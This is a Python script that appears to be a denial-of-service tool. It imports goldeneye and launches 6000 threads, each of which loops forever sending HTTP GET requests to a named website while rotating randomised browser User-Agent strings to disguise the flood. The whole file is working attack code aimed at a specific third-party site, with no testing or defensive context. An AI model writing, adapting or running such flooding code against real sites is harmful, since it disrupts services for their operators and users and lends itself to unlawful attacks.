import sys
import goldeneye
import httplib
import requests
import threading
import time
import random

print 'Start: '

threads = []
count = 0

# <editor-fold defaultstate="collapsed" desc="User-Agent">
USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for
                    i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (
            random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537),
            random.randint(1, 36)) for i in range(1, 30)] + ['Version/%d.%d.%d Safari/%d.%d' % (
            random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537),
            random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6)] + [
                    '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for
                    i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (
            random.randint(2001, 2010), random.randint(1, 31), random.randint(1, 12), random.randint(10, 25)) for i in
                     range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}


# </editor-fold>


class Firer(threading.Thread):
    useragents = []

    def __init__(self, i):
        threading.Thread.__init__(self)
        self.i = i

    def getUserAgent(self):

        if self.useragents:
            return random.choice(self.useragents)

        # Mozilla/[version] ([system and browser information]) [platform] ([platform details]) [extensions]

        ## Mozilla Version
        mozilla_version = "Mozilla/5.0"  # hardcoded for now, almost every browser is on this version except IE6

        ## System And Browser Information
        # Choose random OS
        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
        os_name = random.choice(os['name'])
        sysinfo = os_name

        # Choose random platform
        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]

        # Get Browser Information if available
        if 'browser_info' in platform and platform['browser_info']:
            browser = platform['browser_info']

            browser_string = random.choice(browser['name'])

            if 'ext_pre' in browser:
                browser_string = "%s; %s" % (random.choice(browser['ext_pre']), browser_string)

            sysinfo = "%s; %s" % (browser_string, sysinfo)

            if 'ext_post' in browser:
                sysinfo = "%s; %s" % (sysinfo, random.choice(browser['ext_post']))

        if 'ext' in os and os['ext']:
            sysinfo = "%s; %s" % (sysinfo, random.choice(os['ext']))

        ua_string = "%s (%s)" % (mozilla_version, sysinfo)

        if 'name' in platform and platform['name']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['name']))

        if 'details' in platform and platform['details']:
            ua_string = "%s (%s)" % (
            ua_string, random.choice(platform['details']) if len(platform['details']) > 1 else platform['details'][0])

        if 'extensions' in platform and platform['extensions']:
            ua_string = "%s %s" % (ua_string, random.choice(platform['extensions']))

        return ua_string

    def run(self):
        # time.sleep(0.1)
        print 'Thread:', i
        while True:
            global count
            count = count + 1
            headers = {'User-Agent': '{0}'.format(self.getUserAgent())}
            res = requests.get('http://www.cxhcrg.com/', headers=headers)
            str = res.content
            res.close()


if __name__ == '__main__':
    for i in range(6000):
        thread = Firer(i)
        thread.start()
        threads.append(thread)

    # for thread in threads:
    #     thread.join()

    while True:
        time.sleep(1)
        print count
